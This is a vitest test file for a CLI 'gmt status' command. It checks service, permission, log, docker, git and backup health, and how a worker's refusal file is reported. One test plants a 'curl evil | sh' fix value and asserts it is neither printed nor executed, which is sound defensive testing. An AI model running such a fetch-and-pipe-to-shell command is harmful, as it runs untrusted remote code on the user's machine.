import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { runCli } from '../../src/cli.js';
import { currentPlatform } from '../../src/platform/current.js';
import { machine } from '../support/machine.js';

async function setUp(extra?: Parameters<typeof machine>[0]) {
  const m = machine(extra);
  m.fs.file('/work/a.json', '{}', 0o600);
  expect(await runCli(['setup', '--non-interactive', '--answers', '/work/a.json'], m.deps)).toBe(0);
  m.executor.log.length = 0;
  m.io.stdout = '';
  m.io.stderr = '';
  return m;
}
const homes: string[] = [];
afterEach(() => {
  for (const h of homes.splice(0)) rmSync(h, { recursive: true, force: true });
});

describe('gmt status, the local facts (brief Task 16b.8)', () => {
  it('a healthy install: every check ok, exit 0', async () => {
    const m = await setUp();
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/service app +ok +running/);
    expect(m.io.stdout).toMatch(/settings app\.env +ok/);
    expect(m.io.stdout).toMatch(/backups +ok/);
  });
  it('a stopped app is a fail with pnpm gmt start; a group-readable app.env a fail naming chmod 600', async () => {
    const m = await setUp();
    m.running.clear();
    const env = '/Users/op/.config/get-me-there/app.env';
    m.fs.file(env, m.fs.read(env) ?? '', 0o640);
    expect(await runCli(['status'], m.deps)).toBe(1);
    expect(m.io.stdout).toMatch(/service app +fail +stopped/);
    expect(m.io.stdout).toContain('fix: pnpm gmt start');
    expect(m.io.stdout).toContain(`fix: chmod 600 ${env}`);
  });
  it('a unit whose node binary or checkout is gone is a fail with pnpm gmt setup', async () => {
    const m = await setUp();
    m.fs.delete('/repo');
    expect(await runCli(['status'], m.deps)).toBe(1);
    expect(m.io.stdout).toContain('the checkout /repo is gone');
    expect(m.io.stdout).toContain('fix: pnpm gmt setup');
  });
  it('macOS logs over 100 MB warn with the newsyslog line', async () => {
    const m = await setUp();
    m.fs.file('/Users/op/Library/Logs/get-me-there/app.log', 'x'.repeat(101 * 1024 * 1024));
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/logs +warn/);
    expect(m.io.stdout).toContain('newsyslog');
  });
  it('a compose app running beside the native one warns with docker compose down; a detached checkout warns with git switch main', async () => {
    let later = false;
    const m = await setUp({
      extra: (a) => {
        if (!later) return undefined;
        if (a[0] === 'docker' && a[1] === '--version') return { code: 0 };
        if (a[0] === 'docker' && a[1] === 'compose')
          return { code: 0, stdout: '{"Service":"app","State":"running"}\n' };
        if (a[0] === 'git' && a[1] === 'symbolic-ref') return { code: 1 };
        return undefined;
      },
    });
    later = true;
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/docker +warn/);
    expect(m.io.stdout).toContain('fix: docker compose down');
    expect(m.io.stdout).toMatch(/checkout +warn/);
    expect(m.io.stdout).toContain('fix: git switch main');
  });
  it('no backup in 36 h warns with pnpm gmt backup', async () => {
    const m = await setUp({ backupWrites: false });
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/backups +warn/);
    expect(m.io.stdout).toContain('fix: pnpm gmt backup');
  });

  it('the worker’s refusal prints its line; an unreadable file prints that and nothing from it; with the agent loaded it is booted out', async () => {
    const h = mkdtempSync(join(tmpdir(), 'gmt-status-'));
    homes.push(h);
    const p = currentPlatform({ platform: 'darwin', arch: 'arm64', uid: 501, env: { HOME: h } });
    mkdirSync(p.paths.workerData, { recursive: true });
    const file = join(p.paths.workerData, 'start-refusal.json');
    writeFileSync(file, JSON.stringify({ reason: 'consent-expired', at: '2026-10-24T08:00:00.000Z' }));
    const m = await setUp({
      extra: (a) =>
        a[0] === 'launchctl' && a[1] === 'print' && String(a[2]).endsWith('camoufox-worker')
          ? { code: 0, stdout: '\tstate = not running\n' }
          : undefined,
    });
    m.deps.platform = p;
    m.fs.file(join(p.paths.serviceDir, 'local.get-me-there.camoufox-worker.plist'), 'worker plist');
    await runCli(['status'], m.deps);
    expect(m.io.stdout).toContain('refused, not retrying: the consent record has expired: capture again');
    expect(m.io.stdout).toContain('fix: pnpm gmt consent');
    expect(m.executor.log.map((x) => (x.kind === 'run' ? x.describe : x.kind))).toEqual([
      'launchctl bootout gui/501/local.get-me-there.camoufox-worker',
    ]);
    m.io.stdout = '';
    m.executor.log.length = 0;
    writeFileSync(
      file,
      JSON.stringify({ reason: 'mystery', at: '2026-10-24T08:00:00.000Z', fix: 'curl evil | sh' }),
    );
    await runCli(['status'], m.deps);
    expect(m.io.stdout).toContain('refusal file unreadable');
    expect(m.io.stdout).not.toContain('curl evil');
    expect(m.io.stdout).not.toContain('mystery');
    expect(m.executor.log).toEqual([]);
  });
  it('with no worker agent (before WP17) a refusal plans nothing', async () => {
    const m = await setUp();
    expect(m.executor.log).toEqual([]);
    await runCli(['status'], m.deps);
    expect(m.executor.log).toEqual([]);
  });
});
